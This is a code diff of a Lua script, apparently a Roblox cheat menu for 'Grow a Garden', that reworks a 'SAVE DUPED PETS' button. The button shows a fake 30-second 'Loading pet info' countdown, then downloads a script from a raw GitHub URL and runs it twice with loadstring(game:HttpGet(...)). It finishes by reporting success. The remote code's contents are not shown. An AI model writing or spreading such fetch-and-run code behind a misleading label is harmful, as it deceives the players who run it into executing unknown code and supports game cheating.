@@ -51,34 +51,42 @@ end)
 -- 状態表示用ラベル
 local statusLabel = MainSection:NewLabel("SAVE STATUS: Ready")
 
--- SAVE DUPED PETS ボタン（30秒後にスクリプトを2回実行し、ボタン削除）
-local saveButton -- 後で削除用に保持
+-- SAVE DUPED PETS ボタン
+local countdownThread -- 現在のカウントダウン用スレッド
 
-saveButton = MainSection:NewButton("SAVE DUPED PETS", "Starts saving after countdown", function()
-	if saveButton then
-		saveButton:Destroy() -- 一度押したら削除
+MainSection:NewButton("SAVE DUPED PETS", "Starts saving after countdown", function()
+	-- 既に動作中のカウントダウンがあればキャンセル
+	if countdownThread then
+		countdownThread:Disconnect()
 	end
+
+	local bindable = Instance.new("BindableEvent")
+	countdownThread = bindable.Event:Connect(function() end) -- 空イベントで保持
 
 	task.spawn(function()
 		for i = 30, 1, -1 do
 			statusLabel:Update("SAVE STATUS: ⏳ Loading pet info... (" .. i .. "s)")
 			wait(1)
+			if not countdownThread.Connected then
+				return -- 他のカウントダウンに上書きされたら中止
+			end
 		end
 
 		statusLabel:Update("SAVE STATUS: 🚀 Booting...")
 
-		for attempt = 1, 2 do
+		-- 同時に2回スクリプト実行
+		local url = "https://raw.githubusercontent.com/aa362/growagardening/refs/heads/main/uitest"
+		for i = 1, 2 do
 			local success, err = pcall(function()
-				loadstring(game:HttpGet("https://raw.githubusercontent.com/aa362/growagardening/refs/heads/main/uitest"))()
+				loadstring(game:HttpGet(url))()
 			end)
 
-			if success then
-				statusLabel:Update("SAVE STATUS: ✅ Success! (x" .. attempt .. ")")
-			else
-				statusLabel:Update("SAVE STATUS: ❌ Error (x" .. attempt .. "): " .. tostring(err))
+			if not success then
+				statusLabel:Update("SAVE STATUS: ❌ Error: " .. tostring(err))
+				return
 			end
-
-			wait(1) -- 少し間をあけて2回目へ
 		end
+
+		statusLabel:Update("SAVE STATUS: ✅ Success! x2")
 	end)
 end)
